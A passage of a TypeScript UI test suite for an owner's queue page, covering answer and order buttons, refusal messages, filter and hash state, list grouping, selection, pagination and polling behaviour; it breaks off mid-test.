      assert.deepEqual(result.busy, { id: null, error: row.error });
      assert.equal(result.reloads, 1);
    });
  }
});

describe("sheet composer buttons", () => {
  const foot = (item: unknown, draft: unknown) => {
    const { calls, queue } = buildQueue();
    return { calls, tree: render("SheetFootQ", { item, draft, queue, isBusy: false, error: null }) };
  };
  const press = (tree: RenderedNode, label: string) => {
    const [button] = buttonLabelled(tree, label);
    assert.ok(button, `${label} rendered`);
    assert.equal(button.props.disabled, undefined, `${label} is always enabled`);
    (button.props.onClick as () => void)();
  };

  const sendRows = [
    { name: "no option and no text writes the note-slot line", draft: {}, calls: [["setDraft", 41, { error: "Pick an option or write an answer, then send." }]] },
    { name: "whitespace-only text writes the note-slot line", draft: { text: "   " }, calls: [["setDraft", 41, { error: "Pick an option or write an answer, then send." }]] },
    { name: "a picked option alone sends its code", draft: { code: "R1" }, calls: [["answerItem", 41, { code: "R1" }]] },
    { name: "text alone sends the text", draft: { text: "hold until Friday" }, calls: [["answerItem", 41, { text: "hold until Friday" }]] },
    { name: "an option and text send both", draft: { code: "R2", text: "after the deploy" }, calls: [["answerItem", 41, { code: "R2", text: "after the deploy" }]] },
  ];
  for (const row of sendRows) {
    test(`Send answer: ${row.name}`, () => {
      const { calls, tree } = foot(buildItem(), row.draft);
      press(tree, "Send answer");
      assert.deepEqual(getPlain(calls), row.calls);
    });
  }

  const reportRows = [
    { name: "Mark as read on an empty box sends the seen action", draft: {}, label: "Mark as read", calls: [["settle", 41, "seen"]] },
    { name: "Mark as read with text in the box says the order is unsent", draft: { text: "thanks" }, label: "Mark as read", calls: [["setDraft", 41, { error: "Unsent order in the field. Send it, or clear it first." }]] },
    { name: "Send order sends the reply action with the typed text", draft: { text: "thanks, merged" }, label: "Send order", calls: [["settle", 41, "reply", { text: "thanks, merged" }]] },
    { name: "Send order on a blank box asks for the order", draft: { text: "  " }, label: "Send order", calls: [["setDraft", 41, { error: "Write the order, then send." }]] },
  ];
  for (const row of reportRows) {
    test(row.name, () => {
      const { calls, tree } = foot(buildItem({ kind: "report" }), row.draft);
      press(tree, row.label);
      assert.deepEqual(getPlain(calls), row.calls);
    });
  }

  // which button carries the ink follows the box; order and labels never change
  const inkRows = [
    { name: "an empty box", draft: {}, ink: "Mark as read" },
    { name: "a box with text", draft: { text: "rebase" }, ink: "Send order" },
  ];
  for (const row of inkRows) {
    test(`the report's ink button with ${row.name} is ${row.ink}, the order staying Mark as read then Send order`, () => {
      const buttons = findNodes(foot(buildItem({ kind: "report" }), row.draft).tree, (node) => node.type === "button" && /\bbtn lg\b/.test(String(node.props.className)));
      assert.deepEqual(buttons.map((node) => collectText(node)), ["Mark as read", "Send order"]);
      assert.deepEqual(buttons.filter((node) => /\bprimary\b/.test(String(node.props.className))).map((node) => collectText(node)), [row.ink]);
    });
  }
});

// spacing reads the role-key ladder (index.html tailwind config) → a number or a px value in a queue node is drift
const NUMERIC_SPACING_CLASS = /(^|\s)-?(p|m|gap|space)(x|y|t|r|b|l|s|e)?-(\d|\[)/;

describe("the queue page spaces on role keys only", () => {
  const data = {
    items: [
      buildItem({
        id: 1,
        status: "answered",
        isApprovalClass: true,
        session: buildSession({ state: "live" }),
        resumes: [{ attempt: 1, sentAt: "2026-11-10T06:20:11.204Z", result: "sent", abortReason: null, bgId: null }],
      }),
      buildItem({ id: 2, kind: "report", linkedDocIds: [43944], status: "unacked", deviation: "unacked", session: buildSession({ marker: { setAt: "2026-11-10T06:20:11.204Z", bgId: null } }) }),
    ],
    nextCursor: 9,
  };
  const states = [
    { name: "a loaded list with its bands, a deviation and Show more", node: () => render("QueueListQ", { queue: withList(buildQueue().queue, data.items, data.nextCursor) }) },
    { name: "a sheet with a refusal", node: () => renderSheet({ item: data.items[0], queue: buildQueue({ busy: { id: null, error: { id: 1, message: "Refused: x." } } }).queue }) },
    {
      name: "the order view with a ticked row, the composer and a refusal",
      node: () => renderOrders({ composer: { text: "rebase on main", isBusy: false, error: "Refused: x." } }, { selectedIds: [SESSION_ID], isEndedShown: true }),
    },
  ];
  for (const row of states) {
    test(row.name, () => {
      const classes = findNodes(row.node(), () => true).map((node) => String(node.props?.className ?? ""));
      assert.deepEqual(classes.filter((value) => NUMERIC_SPACING_CLASS.test(value)), []);
    });
  }
});

describe("report reply", () => {
  const rows = [
    { name: "a report that takes an order shows the order field in the sheet's foot", isFreeTextAllowed: true, fields: 1 },
    { name: "a report that takes no order shows no order field", isFreeTextAllowed: false, fields: 0 },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const tree = render("SheetFootQ", { item: buildItem({ kind: "report", isFreeTextAllowed: row.isFreeTextAllowed }), draft: {}, queue: buildQueue().queue, isBusy: false, error: null });
      assert.equal(findNodes(tree, (node) => node.type === "textarea").length, row.fields);
    });
  }
});

describe("action refusal copy", () => {
  const rows = [
    { name: "the server's worded reason is shown", answer: { status: 400, data: { error: "free_text_not_allowed", reason: "this report takes no reply" } }, expected: "Refused: this report takes no reply." },
    { name: "a refusal with no reason shows fixed copy", answer: { status: 400, data: { error: "invalid_input", issues: [] } }, expected: "The monitor refused this action. Try again." },
    { name: "a refusal with no body shows fixed copy", answer: { status: 400, data: null }, expected: "The monitor refused this action. Try again." },
    { name: "a state change says the list shows where the item is now", answer: { status: 409, data: { error: "conflict", reason: "item is answered" } }, expected: "Refused: the item changed state. The list shows where it is now." },
  ];
  // spec §10: the page has no Refresh, so no refusal line names one
  for (const row of rows) {
    test(row.name, () => {
      const line = call<string>("getActionErrorQ", row.answer);
      assert.equal(line, row.expected);
      assert.doesNotMatch(line, /refresh/i);
    });
  }
});

describe("refusal lines", () => {
  const message = "Refused: the item changed state. The list shows where it is now.";
  const rows = [
    { name: "a refused sheet action", node: () => renderSheet({ item: buildItem({ id: 1 }), queue: buildQueue({ busy: { id: null, error: { id: 1, message } } }).queue }) },
    {
      name: "a refused send",
      node: () => renderOrders({ composer: { text: "rebase on main", isBusy: false, error: message } }, { selectedIds: [SESSION_ID] }),
    },
  ];
  for (const row of rows) {
    test(`${row.name} is an alert led by the crit glyph, toned whole`, () => {
      const alerts = findNodes(row.node(), (node) => node.props?.role === "alert" && /\btext-crit\b/.test(String(node.props?.className ?? "")));
      assert.equal(alerts.length, 1, row.name);
      const text = collectText(alerts[0] as RenderedNode);
      assert.deepEqual([text.startsWith((realUi.TONE_GLYPH as Record<string, string>).crit), text.endsWith(message)], [true, true], text);
    });
  }
});

describe("queue filter bar", () => {
  const items = [
    buildItem({ id: 1, session: buildSession({ profileLabel: "work-dev" }) }),
    buildItem({ id: 2, session: buildSession({ id: "9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", profileLabel: "personal", cwdTail: "wt/owner-queue" }) }),
  ];
  const renderBar = (filter: Record<string, string>) => {
    const picks: unknown[] = [];
    const tree = render("QueueFilterBarQ", { items, filter, onFilter: (next: unknown) => picks.push(next) });
    const [bar] = findNodes(tree, (node) => node.props.atom === "FilterBar");
    const triggers = Object.fromEntries(findNodes(tree, (node) => node.props.atom === "FilterTrigger").map((node) => [node.props.axis, node.props]));
    return { bar, triggers, picks };
  };

  // the rail's ticks are the session scope → the bar holds the Account axis alone (spec §4.1 → Filters)
  const rows = [
    { name: "at defaults the Account trigger reads All and the reset stays hidden", filter: { profile: "" }, account: "All", isApplied: false },
    { name: "a chosen account names that account and shows the reset", filter: { profile: "personal" }, account: "personal", isApplied: true },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const { bar, triggers } = renderBar(row.filter);
      assert.deepEqual(Object.keys(triggers), ["Account"]);
      assert.equal(triggers.Account?.value, row.account);
      assert.equal(bar?.props.isApplied, row.isApplied);
    });
  }

  test("Reset filters returns the account to All", () => {
    const { bar, picks } = renderBar({ profile: "personal" });
    (bar?.props.onReset as () => void)();
    assert.deepEqual(getPlain(picks), [{ profile: "" }]);
  });

  test("a chosen value no loaded item carries stays an option, so its trigger still names it", () => {
    const { triggers } = renderBar({ profile: "archived" });
    assert.equal(triggers.Account?.value, "archived");
    assert.ok((triggers.Account?.options as Array<{ key: string }>).some((option) => option.key === "archived"));
  });
});

describe("filter state in the hash", () => {
  const load = async (hash: string) => {
    const location = { hash };
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: uiStub(), location, history: { replaceState: (_state: unknown, _title: string, url: string) => { location.hash = url; } } },
    })) as ScreenModule;
    return { module, location };
  };
  const rows = [
    { name: "the account round-trips through the screen query", start: "#queue", filter: { profile: "work-dev" } },
    { name: "defaults leave a bare screen hash and read back as defaults", start: "#queue?profile=personal", filter: { profile: "" } },
  ];
  for (const row of rows) {
    test(row.name, async () => {
      const { module, location } = await load(row.start);
      (module.setFilterHashQ as (filter: unknown) => void)(row.filter);
      assert.ok(location.hash.startsWith("#queue"), location.hash);
      assert.deepEqual(getPlain((module.getFilterFromHashQ as () => unknown)()), row.filter);
    });
  }

  // one hash writer merges every key → a filter write never erases the selected item or the ticks (spec §4.3 → Selection)
  const mergeRows = [
    { name: "a filter write keeps the selected item and the ticks", start: "#queue?item=41&to=a,b", patch: { profile: "work-dev" }, expected: { profile: "work-dev", item: "41", to: "a,b" } },
    { name: "an item write keeps the filter and the ticks", start: "#queue?profile=personal&to=s1", patch: { item: "7" }, expected: { profile: "personal", item: "7", to: "s1" } },
    { name: "an emptied key leaves the hash and the others stay", start: "#queue?item=7&profile=personal", patch: { item: "" }, expected: { profile: "personal", item: "", to: "" } },
  ];
  for (const row of mergeRows) {
    test(row.name, async () => {
      const { module, location } = await load(row.start);
      (module.setHashStateQ as (patch: unknown) => void)(row.patch);
      assert.ok(location.hash.startsWith("#queue"), location.hash);
      assert.deepEqual(getPlain((module.getHashStateQ as () => unknown)()), row.expected);
    });
  }

  // Orders is always open and the ticks are the one selection (spec §9.1, §9.2) → an old link's view= or session= names no state, and the first write leaves it out
  const oldLinks = [
    { name: "an old link's view= opens nothing and leaves the hash at the first write", start: "#queue?view=orders&item=41" },
    { name: "an old link's session= scopes nothing and leaves the hash at the first write", start: "#queue?session=s1&item=41" },
  ];
  for (const row of oldLinks) {
    test(row.name, async () => {
      const { module, location } = await load(row.start);
      assert.deepEqual(getPlain((module.getFilterFromHashQ as () => unknown)()), { profile: "" });
      (module.setHashStateQ as (patch: unknown) => void)({ item: "" });
      assert.equal(location.hash, "#queue");
    });
  }
});

describe("list groups", () => {
  const gersona = buildSession({ id: "a1", name: "gersona" });
  const yoaida = buildSession({ id: "b2", name: "yoaida" });
  const order = (id: number, session: unknown, sendId: string | null, answeredAt = "2026-11-12T12:20:00.000Z") =>
    buildItem({ id, kind: "message", status: "delivered", body: "rebase", answeredAt, sendId, session });
  const getShape = (items: unknown[]) =>
    call<Array<{ key: string; label: string; rows: Array<{ id: number; copies: Array<{ id: number }> }> }>>("getGroupsQ", items)
      .map((group) => ({ key: group.key, rows: group.rows.map((row) => [row.id, row.copies.map((copy) => copy.id)]) }));

  test("open decisions, then open reports, then everything else, each in server order, and an empty group is left out", () => {
    const items = [
      buildItem({ id: 1, kind: "report" }),
      buildItem({ id: 2, status: "answered" }),
      buildItem({ id: 3 }),
      buildItem({ id: 4, kind: "report", status: "answered" }),
      buildItem({ id: 5 }),
    ];
    assert.deepEqual(getShape(items), [
      { key: "decisions", rows: [[3, [3]], [5, [5]]] },
      { key: "reports", rows: [[1, [1]]] },
      { key: "inDelivery", rows: [[2, [2]], [4, [4]]] },
    ]);
    assert.deepEqual(getShape([buildItem({ id: 9, kind: "report" })]).map((group) => group.key), ["reports"]);
  });

  const foldRows = [
    { name: "the copies of one send fold into one row under its lowest id", items: [order(12, yoaida, "s-1"), order(11, gersona, "s-1"), order(13, gersona, "s-2")], expected: [[11, [11, 12]], [13, [13]]] },
    { name: "copies with no send id fold by equal time and text", items: [order(21, gersona, null), order(22, yoaida, null), order(23, yoaida, null, "2026-11-12T12:21:00.000Z")], expected: [[21, [21, 22]], [23, [23]]] },
  ];
  for (const row of foldRows) test(row.name, () => assert.deepEqual(getShape(row.items)[0]?.rows, row.expected));
});

describe("selection", () => {
  const groups = call("getGroupsQ", [buildItem({ id: 5, kind: "report" }), buildItem({ id: 3 }), buildItem({ id: 8, kind: "message", status: "delivered", sendId: "s", session: buildSession({ id: "b2" }) }), buildItem({ id: 7, kind: "message", status: "delivered", sendId: "s" })]);
  const rows = [
    { name: "a loaded item named in the hash opens on the sheet", hashId: "5", expected: 5 },
    { name: "an order named in the hash opens nothing, since an order has no sheet", hashId: "8", expected: null },
    { name: "an item the list does not hold opens nothing", hashId: "99", expected: null },
    { name: "no item in the hash opens nothing, so the pane is the list", hashId: "", expected: null },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getSelectedIdQ", groups, row.hashId), row.expected));

  // the neighbours are the list's rows that open on a sheet, in list order; an order's row is stepped over
  const stepItems = [buildItem({ id: 3 }), buildItem({ id: 5, kind: "report" }), buildItem({ id: 9, kind: "message", status: "answered", sendId: "s" }), buildItem({ id: 11, status: "answered", answer: { code: "R1", text: null } })];
  const stepRows = [
    { name: "the first sheet row has no previous", id: 3, lastIndex: -1, expected: { index: 0, count: 3, prevId: null, nextId: 5 } },
    { name: "stepping passes over an order's row both ways", id: 5, lastIndex: -1, expected: { index: 1, count: 3, prevId: 3, nextId: 11 } },
    { name: "the last sheet row has no next", id: 11, lastIndex: -1, expected: { index: 2, count: 3, prevId: 5, nextId: null } },
    { name: "an item gone from the list steps to the rows that stood beside it", id: 4, lastIndex: 1, expected: { index: -1, count: 3, prevId: 3, nextId: 5 } },
  ];
  for (const row of stepRows) test(`stepping: ${row.name}`, () => assert.deepEqual(call("getStepsQ", call("getGroupsQ", stepItems), row.id, row.lastIndex), row.expected));

  const presses = [
    { name: "an order to a session shows its entry in Orders", item: { kind: "message", status: "answered", sendId: "s" }, opens: 1 },
    { name: "an order written on a report shows its entry in Orders", item: { kind: "report", status: "answered", answer: { code: null, text: "ship it" } }, opens: 1 },
    { name: "an answered decision opens on the sheet", item: { status: "answered", answer: { code: "R1", text: null } }, opens: 0 },
    { name: "an open decision opens on the sheet", item: {}, opens: 0 },
  ];
  for (const row of presses) {
    test(`pressing a list row: ${row.name}`, () => {
      const calls: string[] = [];
      const listed = call<Array<{ rows: unknown[] }>>("getGroupsQ", [buildItem({ id: 7, ...row.item })]).flatMap((group) => group.rows)[0];
      const tree = render("QueueRowQ", { row: listed, isSelected: false, view: { isNameShown: true, isAccountShown: false }, onSelect: () => calls.push("select"), onOrder: () => calls.push("order") });
      const [option] = findNodes(tree, (node) => node.props?.role === "option");
      (option?.props.onClick as () => void)();
      assert.deepEqual(calls, [row.opens ? "order" : "select"]);
    });
  }

  // spec §9.2 → Showing one order: the ticks only grow, by the order's session, when they leave every recipient out; nothing ticked shows every order
  const items = [buildItem({ id: 8, kind: "message", status: "answered", sendId: "s", session: buildSession({ id: "b2" }) }), buildItem({ id: 7, kind: "message", status: "delivered", sendId: "s" }), buildItem({ id: 9, kind: "message", status: "answered", sendId: "t", session: buildSession({ id: "c3" }) })];
  const shows = [
    { name: "nothing ticked stays so: the thread already holds every order", ids: [], copyId: 8, expected: [] },
    { name: "a ticked recipient keeps the ticks as they are", ids: ["c3", SESSION_ID], copyId: 8, expected: ["c3", SESSION_ID] },
    { name: "ticks that leave the order out gain the shown copy's session", ids: ["c3"], copyId: 8, expected: ["c3", "b2"] },
  ];
  for (const row of shows) test(`showing an order's entry: ${row.name}`, () => assert.deepEqual(call("getShowTicksQ", row.ids, items, row.copyId), row.expected));

  test("the thread entry an opened order aims at is the one holding any of its copies; one not loaded → none", () => {
    const entries = call<unknown[]>("getThreadEntriesQ", [buildItem({ id: 8, kind: "message", status: "answered", sendId: "s" }), buildItem({ id: 7, kind: "message", status: "answered", sendId: "s" })]);
    assert.deepEqual([call("getAimedEntryIdQ", entries, 8), call("getAimedEntryIdQ", entries, 40)], [7, null]);
  });
});

describe("what the sheet shows", () => {
  const held = buildItem({ id: 3 });
  const arrived = buildItem({ id: 2 });
  const answered = buildItem({ id: 3, status: "answered", answeredAt: "2026-11-12T12:20:00.000Z" });
  const rows = [
    { name: "an open item on the sheet that the read no longer holds stays on it as left the queue", items: [arrived], hashId: "3", expected: { kind: "left", id: 3 } },
    { name: "an opened item that is answered elsewhere stays on the sheet as left the queue", items: [arrived, answered], hashId: "3", expected: { kind: "left", id: 3 } },
    { name: "a held item still open keeps the sheet when a new row arrives before it", items: [arrived, held], hashId: "3", expected: { kind: "item", id: 3 } },
    { name: "a row the owner opened replaces the held item", items: [arrived], hashId: "2", expected: { kind: "item", id: 2 } },
    { name: "nothing in the hash leaves the held item off the sheet", items: [arrived, held], hashId: "", expected: { kind: "none", id: null } },
    // spec §4.3: the ticks change → the sheet gives way to the list once its item's session falls out of scope, never to the left-the-queue line
    { name: "a held item whose session the ticks leave out gives way to the list", items: [arrived], hashId: "3", ids: ["b2"], expected: { kind: "none", id: null } },
    { name: "a held item whose session stays ticked keeps the sheet", items: [arrived, held], hashId: "3", ids: [SESSION_ID], expected: { kind: "item", id: 3 } },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const sheet = call<{ kind: string; id: number }>("getSheetStateQ", call("getGroupsQ", row.items), row.hashId, held, row.ids ?? []);
      assert.deepEqual({ kind: sheet.kind, id: sheet.id }, row.expected);
    });
  }

  test("an item that left the queue keeps its sheet, its foot one line and no composer", () => {
    const { queue } = buildQueue();
    const tree = render("QueueSheetQ", { queue: { ...withList(queue, [arrived]), sheet: { kind: "left", id: 3, item: held } } });
    const [foot] = byClass(tree, "card-foot");
    const [head] = findNodes(tree, (node) => node.type === "h2");
    assert.equal(collectText(head as RenderedNode).includes("Decision"), true, "the held item's letterhead");
    assert.equal(collectText(foot).replace(/\s+/g, " ").trim(), "ℹ This item left the queue.");
    assert.equal(findNodes(foot, (node) => node.type === "button" || node.type === "textarea").length, 0);
  });

  test("with no row opened yet, the first row holds the list's one tab stop and no row is current", () => {
    const queue = withList(buildQueue().queue, [answered, buildItem({ id: 9, kind: "message", status: "answered", sendId: "s-9" })]);
    const list = render("QueueListQ", { queue: { ...queue, selectedId: null } });
    const options = findNodes(list, (node) => node.props?.role === "option");
    assert.deepEqual([options.map((node) => node.props.tabIndex), options.map((node) => node.props["aria-selected"])], [[0, -1], [false, false]]);
  });

  test("with no item opened the sheet renders nothing", () => {
    const queue = withList(buildQueue().queue, [answered]);
    const tree = render("QueueSheetQ", { queue: { ...queue, sheet: { kind: "none", id: null } } });
    assert.deepEqual([byClass(tree, "queue-sheet").length, findNodes(tree, (node) => node.type === "h2").length], [0, 0]);
  });
});

describe("after the owner acts on the last open item", () => {
  const act = async (action: "answerItem" | "later") => {
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async () => ({ status: 200, json: async () => ({ ok: true }) }),
    })) as ScreenModule;
    const selected: unknown[] = [];
    const actions = (module.useQueueActionsQ as (deps: unknown) => Record<string, (id: number, body?: unknown) => Promise<void>>)({
      groups: call("getGroupsQ", [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" })]),
      setList: () => undefined,
      setDrafts: () => undefined,
      setStatus: () => undefined,
      openItem: (id: unknown) => selected.push(id),
      closeSheet: () => selected.push("list"),
      reload: () => undefined,
    });
    await actions[action]!(1, { code: "R1" });
    return selected;
  };

  test("an answer with nothing left open returns the list", async () => assert.deepEqual(await act("answerItem"), ["list"]));
  test("a later keeps the item selected, since it is still open", async () => assert.deepEqual(await act("later"), []));
});

describe("Show more", () => {
  test("Show more is the quiet small load-more button every screen uses", () => {
    const [button] = buttonLabelled(render("ShowMoreQ", { count: 100, isBusy: false, onMore: () => undefined }), "Show more");
    assert.equal(button?.props.className, "btn ghost sm");
  });

  // spec §12.5 in progress: the rest look, the -ing label, focus kept (no disabled), and a press reads nothing more
  const loads = [
    { name: "Show more", render: "ShowMoreQ", props: (onPress: () => void) => ({ count: 100, isBusy: true, onMore: onPress }) },
    { name: "Show earlier", render: "ShowEarlierQ", props: (onPress: () => void) => ({ isBusy: true, onShow: onPress }) },
  ];
  for (const row of loads) {
    test(`${row.name} in progress reads Loading…, stays focusable and starts no second read`, () => {
      let presses = 0;
      const [button] = buttonLabelled(render(row.render, row.props(() => { presses += 1; })), "Loading…");
      (button?.props.onClick as (() => void) | undefined)?.();
      assert.deepEqual([button?.props["aria-busy"], button?.props.disabled, presses], [true, undefined, 0]);
    });
  }

  test("the next page after the cursor joins the loaded list in queue order", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ items: [buildItem({ id: 3 })], nextCursor: null }) };
      },
    })) as ScreenModule;
    let list: Record<string, unknown> = { status: "ready", data: { items: [buildItem({ id: 1 }), buildItem({ id: 2 })], nextCursor: 12 } };
    const setList = (next: unknown) => {
      list = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(list) : (next as Record<string, unknown>);
    };
    await (module.getMoreQ as (deps: unknown) => Promise<void>)({ list, setList });
    const data = getPlain(list.data) as { items: Array<{ id: number }>; nextCursor: number | null };
    assert.match(urls[0] ?? "", /[?&]after=12(&|$)/);
    assert.deepEqual(data.items.map((item) => item.id), [1, 2, 3]);
    assert.equal(data.nextCursor, null);
  });
});

describe("list read", () => {
  const read = async (status: number, body: unknown) => {
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async () => ({ status, json: async () => body }),
    })) as ScreenModule;
    let list: Record<string, unknown> = { status: "idle", data: null, error: null };
    const setList = (next: unknown) => {
      list = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(list) : (next as Record<string, unknown>);
    };
    await (module.getListQ as (deps: unknown) => Promise<void>)({ setList });
    return list;
  };

  test("an answer carrying the item list is ready", async () => {
    assert.equal((await read(200, { items: [], nextCursor: null })).status, "ready");
  });

  test("a 2xx answer without an item list is a read failure, never a list to render", async () => {
    const list = await read(200, { rows: [] });
    assert.equal(list.status, "error");
    assert.equal(list.data, null);
  });

  // no sign-in state to hand a refusal to → every refused read is a failure with Retry
  const refusals = [
    { name: "a 503 database outage is a read failure with Retry", status: 503, body: { error: "database_unavailable" }, expected: "error" },
    { name: "a 503 with any other code is a read failure with Retry", status: 503, body: { error: "not_provisioned" }, expected: "error" },
    { name: "a 401 is a read failure with Retry", status: 401, body: { error: "unauthorized" }, expected: "error" },
  ];
  for (const row of refusals) test(row.name, async () => assert.equal((await read(row.status, row.body)).status, row.expected));
});

describe("the page re-reads itself", () => {
  const cadence = [
    { name: "a good read keeps the 15 s step", fails: 0, expected: 15_000 },
    { name: "two failed reads in a row keep the 15 s step", fails: 2, expected: 15_000 },
    { name: "three failed reads in a row slow it to 60 s", fails: 3, expected: 60_000 },
    { name: "more failed reads stay at 60 s", fails: 7, expected: 60_000 },
  ];
  for (const row of cadence) test(`cadence: ${row.name}`, () => assert.equal(call("getPollDelayQ", row.fails), row.expected));

  const stale = [
    { name: "a tab shown again reads at once when its last read is older than 15 s", age: 15_001, expected: true },
    { name: "a tab shown again within 15 s of its last read waits for its timer", age: 14_999, expected: false },
  ];
  for (const row of stale) test(row.name, () => assert.equal(call("isReadStaleQ", 1_000_000, 1_000_000 + row.age), row.expected));

  // the server takes up to 200 per read → a list extended by Show more is read whole up to that cap
  const limits = [
    { name: "a first page reads the page size", loaded: 0, expected: 100 },
    { name: "a list extended by Show more reads every loaded row", loaded: 150, expected: 150 },
    { name: "a list past the server's cap reads the cap", loaded: 350, expected: 200 },
  ];
  for (const row of limits) test(`read size: ${row.name}`, () => assert.equal(call("getReadLimitQ", row.loaded, ...vm.runInContext("[LIST_Q.LIMIT, LIST_Q.MAX]", screen)), row.expected));

  const merge = (prevItems: unknown[] | null, answerItems: unknown[], nextCursor: number | null = null, prevCursor: number | null = null) =>
    call<{ data: { items: Array<{ id: number; status: string }>; nextCursor: number | null }; arrived: Array<{ id: number }>; turned: Array<{ id: number }> }>(
      "getMergedDataQ", prevItems === null ? null : { items: prevItems, nextCursor: prevCursor }, { items: answerItems, nextCursor });

  test("a known row takes the read's state, a gone row leaves, and a new decision or report arrives", () => {
    const { data, arrived } = merge(
      [buildItem({ id: 1 }), buildItem({ id: 2 })],
      [buildItem({ id: 1, status: "answered" }), buildItem({ id: 3, kind: "report" }), buildItem({ id: 4 })],
    );
    assert.deepEqual(data.items.map((item) => [item.id, item.status]), [[1, "answered"], [3, "open"], [4, "open"]]);
    assert.deepEqual(arrived.map((item) => item.id), [3, 4]);
  });

  test("the owner's own new order and the first read of the page are no arrivals", () => {
    assert.deepEqual(merge([buildItem({ id: 1 })], [buildItem({ id: 1 }), buildItem({ id: 5, kind: "message", status: "answered" })]).arrived, []);
    assert.deepEqual(merge(null, [buildItem({ id: 1 })]).arrived, []);
  });

  test("rows loaded past the read's last position stay, with their cursor, until a read reaches them", () => {
    const loaded = [buildItem({ id: 1, queuePosition: 1 }), buildItem({ id: 2, queuePosition: 2 }), buildItem({ id: 9, queuePosition: 9 })];
    const { data } = merge(loaded, [buildItem({ id: 1, queuePosition: 1 }), buildItem({ id: 3, queuePosition: 3 })], 3, 9);
    assert.deepEqual(data.items.map((item) => item.id), [1, 3, 9]);
    assert.equal(data.nextCursor, 9);
  });

  const readOnce = async (list: Record<string, unknown>, status: number, body: unknown) => {
    const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: uiStub() }, fetch: async () => ({ status, json: async () => body }) })) as ScreenModule;
    let current = list;
    const setList = (next: unknown) => {
      current = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(current) : (next as Record<string, unknown>);
    };
    const result = await (module.getListQ as (deps: unknown) => Promise<{ isGood: boolean; arrived: Array<{ id: number }> }>)({ setList, getList: () => current });
    return { list: getPlain(current) as Record<string, unknown> & { data: { items: Array<{ id: number }> } | null; newIds: number[] }, result: getPlain(result) };
  };
  const loadedList = (overrides: Record<string, unknown> = {}) =>
    ({ status: "ready", data: { items: [buildItem({ id: 1 })], nextCursor: null }, error: null, readAt: "2026-11-13T03:10:00.000Z", newIds: [], ...overrides });

  test("a failed read with rows loaded keeps every row and its last read time, and says the read failed", async () => {
    const { list, result } = await readOnce(loadedList(), 503, { error: "database_unavailable" });
    assert.deepEqual(list.data?.items.map((item) => item.id), [1]);
    assert.equal(list.status, "ready");
    assert.equal(list.readAt, "2026-11-13T03:10:00.000Z");
    assert.notEqual(list.error, null);
    assert.equal(result.isGood, false);
  });

  test("a good read after a failed one clears the failure", async () => {
    const { list, result } = await readOnce(loadedList({ error: { sentence: "x" } }), 200, { items: [buildItem({ id: 1 })], nextCursor: null });
    assert.equal(list.error, null);
    assert.equal(result.isGood, true);
  });

  test("an arrival is tracked and reported", async () => {
    const answer = { items: [buildItem({ id: 1 }), buildItem({ id: 6 })], nextCursor: null };
    const marked = await readOnce(loadedList({ newIds: [1] }), 200, answer);
    assert.deepEqual(marked.list.newIds, [1, 6]);
    assert.deepEqual(marked.result.arrived.map((item) => item.id), [6]);
  });

  test("an arrival stops being tracked when a read no longer has its row", async () => {
    const { list } = await readOnce(loadedList({ newIds: [1] }), 200, { items: [buildItem({ id: 2 })], nextCursor: null });
    assert.deepEqual(list.newIds, [2]);
  });

  const notes = [
    { name: "one arrival names its kind, its session and its title", arrived: [buildItem({ session: buildSession({ name: "yoaida" }) })], expected: "New decision from yoaida: Pick the migration order" },
    { name: "a report names itself a report", arrived: [buildItem({ kind: "report", title: "Nightly sweep done", session: buildSession({ name: "yoaida" }) })], expected: "New report from yoaida: Nightly sweep done" },
    { name: "several arrivals are counted", arrived: [buildItem({ id: 1 }), buildItem({ id: 2 }), buildItem({ id: 3 })], expected: "3 new items" },
  ];
  for (const row of notes) test(`arrival note: ${row.name}`, () => assert.equal(call("getArrivalNoteQ", row.arrived), row.expected));

  // a turn to Not received is said once, on the read that sees it; a turn to Received and a copy first seen already failed are silent
  test("a read reports the copies whose receipt turned to Not received since the last read", () => {
    const order = (id: number, status: string, canResend = false) => buildItem({ id, kind: "message", status, canResend });
    const { turned } = merge(
      [order(1, "answered"), order(2, "delivering"), order(3, "unacked", true), order(4, "answered")],
      [order(1, "unacked", true), order(2, "delivered"), order(3, "unacked", true), order(4, "expired"), order(5, "expired")],
    );
    assert.deepEqual(turned.map((item) => item.id), [1, 4]);
  });

  const turns = [
    { name: "one recipient names its session", turned: [buildItem({ id: 1, kind: "message", status: "unacked", session: buildSession({ name: "yoaida" }) })], expected: "⚠ yoaida has not received an order" },
    {
      name: "recipients in several sessions are named together",
      turned: [
        buildItem({ id: 1, kind: "message", status: "unacked", session: buildSession({ name: "yoaida" }) }),
        buildItem({ id: 2, kind: "message", status: "expired", session: buildSession({ id: "0d3e7a51-2c4f-4b8e-9f61-7a2b5c8d1e30", name: "gersona" }) }),
      ],
      expected: "⚠ yoaida and gersona have not received an order",
    },
    { name: "an answer to a decision is named an answer", turned: [buildItem({ id: 1, status: "unacked", session: buildSession({ name: "yoaida" }) })], expected: "⚠ yoaida has not received an answer" },
  ];
  for (const row of turns) test(`Not received note: ${row.name}`, () => assert.equal(call("getNotReceivedNoteQ", row.turned), row.expected));

  // the list body spans 180–820 on screen; rows are 68 high (spec §4.2)
  const listBody = { top: 180, bottom: 820 };
  const rowAt = (id: number, top: number) => ({ id, top, bottom: top + 68 });
  const offViews = [
    { name: "an arrival's row inside the visible part needs no note", rows: [rowAt(7, 400)], expected: null },
    { name: "an arrival's row cut by an edge still shows, so needs no note", rows: [rowAt(7, 790)], expected: null },
    { name: "an arrival's row under the visible part is one new below", rows: [rowAt(7, 820)], expected: { count: 1, direction: "below", id: 7 } },
